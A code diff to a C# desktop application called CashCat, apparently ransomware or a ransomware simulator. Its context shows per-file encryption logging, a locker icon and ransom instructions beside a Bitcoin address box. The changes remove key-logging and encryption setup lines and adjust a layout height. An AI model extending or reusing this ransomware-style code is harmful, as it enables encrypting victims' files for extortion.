@@ -28,7 +28,6 @@ namespace CashCat
     {
 
         private FileSystemOperation fileOperations;
-        private EncryptionOperation encryptionOperation;
         private static readonly HttpClient client = new HttpClient();
         public FileInfo[] filesToEncrypt;
         public FileInfo[] filesToDecrypt;
@@ -49,12 +48,8 @@ namespace CashCat
 
             InitializeComponent();
             fileOperations = new FileSystemOperation();
-            encryptionOperation = new EncryptionOperation();
 
             fileOperations.WriteLog("CashCat Started!");
-
-            fileOperations.LogKeyData(encryptionOperation.getRSAPrivateKey(),encryptionOperation.getRSAPublicKey());
-
             fileOperations.WriteLog("CashCat Searching for Config!");
 
             //Load Config JSON
@@ -136,7 +131,6 @@ namespace CashCat
                 {
                     FileInfo fileToEncrypt = file;
                     fileOperations.WriteLog("Encrypting: " + file.Name.ToString() + "!");
-
 
                     Dispatcher.Invoke(new Action(() => {
                         RotateIcon(LockerIcon, 5);
@@ -232,7 +226,7 @@ namespace CashCat
                     txtbox_Instructions.Text = decryptedMessage;
                     btn_send.Visibility = Visibility.Hidden;
                     txtbox_Bitcoingaddess.Visibility = Visibility.Hidden;
-                    rectInstructionsBackground.Height = 335;
+                    rectInstructionsBackground.Height = 345;
                     Height = 455;
                 }), DispatcherPriority.ContextIdle);
 
